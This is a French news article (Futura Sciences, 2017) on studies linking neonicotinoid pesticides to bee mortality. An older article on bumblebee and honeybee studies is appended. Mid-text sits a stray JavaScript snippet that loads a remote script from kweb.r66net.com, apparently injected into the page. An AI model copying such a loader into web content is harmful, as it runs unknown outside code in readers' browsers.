{"title": "Déclin des abeilles : les pesticides néonicotinoïdes à nouveau accusés", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "03/07/2017", "content": "Alors que la polémique sur les néonicotinoïdes a refait surface cette semaine dans l'actualité politique française, la revue  Science  publie une nouvelle étude canadienne qui pointe du doigt les dangers de ces pesticides pour les abeilles. Ce qu'il faut retenir Les néonicotinoïdes sont des pesticides utilisés pour enrober des semences. Les abeilles vivant près des champs qui ont poussé à partir de telles semences récoltent du pollen contaminé. Les néonicotinoïdes diminuent l'espérance de vie des abeilles et perturbent leur navigation. Alors que les  néonicotinoïdes  sont interdits en France depuis 2016 et soumis à un moratoire européen depuis 2013, leurs dangers font toujours débat outre-Atlantique. Au  Canada , trois néonicotinoïdes sont approuvés pour l'agriculture : l'imidaclopride, la clothianidine et le thiaméthoxame.  De nombreuses études ont signalé les effets néfastes des « néonics » sur la santé des abeilles. Pour beaucoup, ces travaux consistaient à traiter de manière expérimentale des abeilles avec des néonicotinoïdes. Certaines de ces recherches ont été critiquées car elles utilisaient des doses ou des durées d'étude jugées irréalistes.  Une équipe de chercheurs de l'université York de Toronto (Canada) a donc voulu étudier l'effet de ces  pesticides  dans des conditions les plus proches possible de la réalité du terrain. Tout d'abord, ils ont suivi les colonies de cinq ruchers proches de champs de maïs qui avaient poussé à partir de graines traitées aux néonicotinoïdes et six ruchers éloignés des activités agricoles. Entre mai et septembre, c'est-à-dire pendant la saison où les abeilles sont actives, les colonies étaient testées.  “ Les néonicotinoïdes se répandent des champs agricoles vers l'environnement alentour Les abeilles ont récolté du  pollen  contaminé avec des néonicotinoïdes. Mais ce pollen ne provenait pas de plants de maïs ou de soja, les deux principales cultures qui poussent à partir de graines traitées. Pour Nadia Tsvetkov, principale auteur de cet article,  « cela indique que les néonicotinoïdes, qui sont solubles dans l'eau, se répandent des champs agricoles vers l'environnement alentour, où ils sont absorbés par d'autres plantes qui sont très attrayantes pour les abeilles » . Les néonicotinoïdes sont des insecticides utilisés pour enrober des semences comme celles de maïs. © izzzy71, Fotolia                               Le pollen contaminé vient de plantes proches des champs traités Pour les auteurs, l'étude démontre que les abeilles des régions qui font pousser du maïs au Canada sont exposées à des niveaux significatifs de néonicotinoïdes pendant la majeure partie de la saison où elles sont actives. Le pollen des plantes, qui ne sont pourtant pas les cibles des néonicotinoïdes, est la principale voie d'exposition des abeilles à ces pesticides. Le saviez-vous ? La mortalité des colonies d’abeilles  Apis mellifera  est élevée dans des régions qui font pousser du maïs dans l’Ontario ou au Québec. Beaucoup de ces champs de maïs utilisent des graines qui ont été traitées avec des néonicotinoïdes.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les chercheurs ont aussi réalisé une autre expérience en complément. Pendant 12 semaines, ils ont nourri des colonies avec un pollen contenant des quantités de plus en plus petites de clothianidine, le néonicotinoïde le plus utilisé dans l'Ontario. L'expérience était censée mimer ce qui devrait se passer dans un champ. Voir aussi : La mortalité des abeilles sauvages triplée par les insecticides Les abeilles ouvrières exposées au pollen traité pendant les neuf premiers jours de leur vie avaient une espérance de vie réduite de 23 %. Les colonies exposées au pollen traité étaient incapables de conserver une reine en bonne santé. Les chercheurs ont aussi trouvé qu'un fongicide couramment utilisé (le boscalide) pouvait interagir avec les néonicotinoïdes et les rendre encore plus dangereux. Pour Valérie Fournier, de l'université Laval, qui a collaboré avec l'équipe York,  « les chercheurs ont constaté que les niveaux réalistes sur le terrain de boscalide peuvent rendre les néonicotinoïdes deux fois plus toxiques pour les abeilles ». Ces travaux paraissent dans  Science . Pour en savoir plus Déclin des abeilles : les pesticides néonicotinoïdes sur la sellette Article de Quentin Mauguit paru le 3 avril 2012 Deux nouvelles études se penchent sur le rôle joué par des insecticides de la famille des néonicotinoïdes sur la surmortalité des abeilles. Une faible  contamination  suffit pour ralentir la croissance d'une colonie, diminuer le nombre de naissances de reines et perturber les capacités de navigations. Les  populations d’abeilles  sont en plein déclin depuis quelques années. Or, ces  insectes  jouent un rôle crucial dans le maintien de la  biodiversité  et dans la survie de nos cultures. Pas moins de  80 % des plantes  exploitées commercialement dans le monde ont besoin de pollinisateurs pour se reproduire. De nombreuses hypothèses ont vu le jour pour expliquer ce phénomène inquiétant. Trois d'entres elles sont proposées de manière récurrente : la présence d'agents  pathogènes  (tel que le  varroa ), l'existence de  virus  ou  champignons  spécifiques et l'utilisation de pesticides.  Les  insecticides  néonicotinoïdes, dont l'utilisation est largement répandue sur la Planète, agissent sur le  système nerveux central  en bloquant les influx et ce, dès une exposition à de très faibles doses (quelques nanogrammes). Ces composés chimiques ont la particularité d'être également présents dans le  pollen  et le nectar des végétaux traités. Malheureusement, ces deux substances sont consommées par les abeilles durant leurs vols en direction des ruches, puis au sein des colonies.  Plusieurs hypothèses relient la surmortalité des  abeilles  à l'emploi de néonicotinoïdes. Elles ont même poussé certains pays, dont la France, à prendre des mesures de précaution. Deux nouvelles études publiées dans la revue  Science  justifient cette démarche. Non seulement les insecticides néonicotinoïdes limitent la croissance des ruches et le développement de nouvelles reines, mais ils provoquent en plus des problèmes de désorientation chez les butineuses. Un graphique accablant : il représente le nombre de nouvelles reines de bourdons terrestres naissant chaque année par ruche et après traitement. Les conséquences d'une exposition à l'imidaclopride sont particulièrement significatives. Or, seules les reines survivent à l'hiver. © Adapté de Whitehorn  et al.  2012,  Science                               Bourdons : moins de jeunes et de reines Dave Goulson , de l'université de Striling, s'est intéressé aux effets de l'imidaclopride sur des bourdons terrestres,  Bombus terrestris . Son équipe a présenté trois lots de 25 colonies respectivement à une substance  placébo  et à une faible et une forte concentration en insecticides (6 et 12 μg par  kg  de pollen) durant 14 jours. Les 75 colonies ont ensuite été replacées à l'extérieur et suivies pendant six semaines supplémentaires. La croissance des populations de bourdons a baissé de respectivement 8 et 12 % pour les spécimens exposés aux faibles ou aux fortes concentrations. Par ailleurs, un plus grand nombre de cellules vides ont été observées (la différence par rapport à une colonie saine est de minimum 19 %) ; il y a donc moins de  larves  en formation.  L'exposition à l'insecticide a eu une troisième conséquence : le nombre de naissances de nouvelles reines a chuté de 85 %. Près de 14 reines ont vu le jour par  ruche  saine, en moyenne, contre seulement 2 au sein des groupes exposés au pesticide. Or, les  bourdons  ont un cycle de vie annuel. Seules les jeunes reines peuvent survivre à l'hiver et former de nouvelles colonies au printemps suivant. La technologie RFID est utilisée pour caractériser les mouvements effectués par une abeille entre sa ruche d'origine et le milieu extérieur. Ce système se compose d'une micropuce de 3 mg collée sur l'insecte (A) et de détecteurs placés à l'entrée de la colonie (B). © Henry  et al.  2012,  Science Express                               Abeilles : une navigation faussée La seconde étude a été menée par une équipe de l'Inra d'Avignon sous la direction de  Mickaël Henry . Les chercheurs ont analysé le comportement de butinage chez des  abeilles domestiques ,  Apis mellifera , exposées à du thiaméthoxame. Près de 653 insectes ont été équipés d'un  RFID  (une micropuce collée sur l' abdomen ) puis soumis à deux traitements différents composés soit d'un placébo, soit de 20 μl d'une solution de  sucrose  contenant 1,34 ng d'insecticide.  Des détecteurs placés à l'entrée des ruches permettent d'identifier les abeilles quittant ou revenant à leur colonie. Le résultat est édifiant : en terrain inconnu 31,6 % des abeilles exposées à l'insecticide ont été incapables de revenir à leur point de départ ! Le thiaméthoxame perturbe donc les capacités de navigation de ces  pollinisateurs .  Ces deux études apportent des preuves concrètes du rôle, certes partiel, joué par les insecticides de la famille des néonicotinoïdes sur la surmortalité des  abeilles . Espérons que de telles preuves puissent faire réagir les pouvoirs publics sur cette problématique afin que de nouvelles réglementations voient le jour. Les tests effectués sur des insectes lors de la mise sur le marché des produits phytosanitaires sont également à revoir.  Kézako : comment les abeilles fabriquent-elles du miel ?                       Le miel est l'un des plus anciens moyens de sucrer les aliments. Il est virtuellement impérissable et sa fabrication demande beaucoup de travail aux abeilles. Unisciel et l’Université de Lille 1 nous expliquent, avec le programme Kézako, les étapes de sa confection.                                       "}